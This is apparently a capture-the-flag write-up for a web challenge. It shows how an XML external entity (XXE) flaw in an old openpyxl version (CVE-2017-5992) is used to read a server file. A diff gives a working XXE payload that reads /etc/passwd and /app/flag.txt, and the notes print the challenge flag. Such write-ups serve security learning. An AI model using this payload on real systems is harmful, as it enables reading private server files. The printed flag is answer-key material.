# [web] vlookup_hot_singles_2

<table><tbody>
<tr><th>Value</th><td>687 pts</td></tr>
<tr><th>Tags</th><td><code>hard</code></td></tr>
<tr><th>Author</th><td>arepi</td></tr>
<tr><th>Connection info</th><td><a href="https://vlookup-hot-singles.jellyc.tf/">https://vlookup-hot-singles.jellyc.tf/</a></td></tr>
</tbody></table>

oh. it's her. well, see if you can get the flag at /app/flag.txt and then get out of there

10 point hint: tooling recommendation/where to start looking

20 point hint: useful info for figuring out the vulnerable codepaths

50 point hint: explicit place to attack and code to do so

---

raw notes:

  - provided source shows they're using `openpyxml` v2.4.1, vulnerable to [CVE-2017-5992](https://nvd.nist.gov/vuln/detail/CVE-2017-5992) (xml external entity injection)
  - we want to craft a spreadsheet that references `flag.txt`
  - Debian bug report includes a PoC: <https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=854442>
  - adapt PoC (noting in `Dockerfile` that full path to flag is `/app/flag.txt`):
    ```diff
    --- a/blank_passwd/docProps/core.xml
    +++ b/test/docProps/core.xml
    @@ -1,3 +1,3 @@
     <?xml version="1.0" encoding="UTF-8" standalone="yes"?>
     <!DOCTYPE foo [
    -   <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><cp:coreProperties xmlns:cp="http://schemas.openxmlformats.org/package/2006/metadata/core-properties" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:dcterms="http://purl.org/dc/terms/" xmlns:dcmitype="http://purl.org/dc/dcmitype/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><dc:creator>Ulikowski, Marcin</dc:creator><cp:lastModifiedBy>Ulikowski, Marcin</cp:lastModifiedBy><dcterms:created xsi:type="dcterms:W3CDTF">2017-01-31T09:02:33Z</dcterms:created><dcterms:modified xsi:type="dcterms:W3CDTF">2017-01-31T09:02:53Z</dcterms:modified><dc:subject>&xxe;</dc:subject></cp:coreProperties>
    +   <!ENTITY xxe SYSTEM "file:///app/flag.txt" >]><cp:coreProperties xmlns:cp="http://schemas.openxmlformats.org/package/2006/metadata/core-properties" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:dcterms="http://purl.org/dc/terms/" xmlns:dcmitype="http://purl.org/dc/dcmitype/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><dc:creator>Ulikowski, Marcin</dc:creator><cp:lastModifiedBy>Ulikowski, Marcin</cp:lastModifiedBy><dcterms:created xsi:type="dcterms:W3CDTF">2017-01-31T09:02:33Z</dcterms:created><dcterms:modified xsi:type="dcterms:W3CDTF">2017-01-31T09:02:53Z</dcterms:modified><dc:subject>&xxe;</dc:subject></cp:coreProperties>
    ```
  - upload, extract download, flag is in `docProps/core.xml`: `jellyCTF{th1s_1snt_a_r3d_0n3_r1gh7?}`
